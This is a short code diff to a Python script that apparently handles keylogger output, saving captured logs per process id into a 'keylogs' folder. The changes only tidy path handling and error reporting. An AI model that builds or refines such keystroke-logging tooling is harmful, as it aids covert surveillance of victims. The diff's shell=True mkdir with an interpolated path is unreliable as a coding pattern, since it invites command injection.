@@ -119,7 +119,7 @@ def read_online_keys():
 def extract_write_data(data_list):
     global program_path
     try:
-        call('mkdir {}/keylogs'.format(program_path), shell=True)
+        call(f"mkdir '{program_path}'/keylogs", shell=True)
     except:
         pass
 
@@ -139,7 +139,7 @@ def extract_write_data(data_list):
             log = row[2]
             if len(log) > 0:
                 one_row_report.append(colors.Green + 'LOGGED' + colors.RESET)
-                with open(f'{program_path}/keylogs/p_id_{p_id}.txt', 'a') as log_file:
+                with open(f"{program_path}/keylogs/p_id_{p_id}.txt", 'a') as log_file:
                     log_file.write('\n\n\n\n\n')
                     log_file.write(log)
 
@@ -148,9 +148,10 @@ def extract_write_data(data_list):
 
             one_row_report.append('Completed')
 
-        except:
+        except Exception as error:
             while len(one_row_report) < 3:
                 one_row_report.append('')
+            print(error)
             one_row_report.append('Error')
 
         extract_report.append(one_row_report)
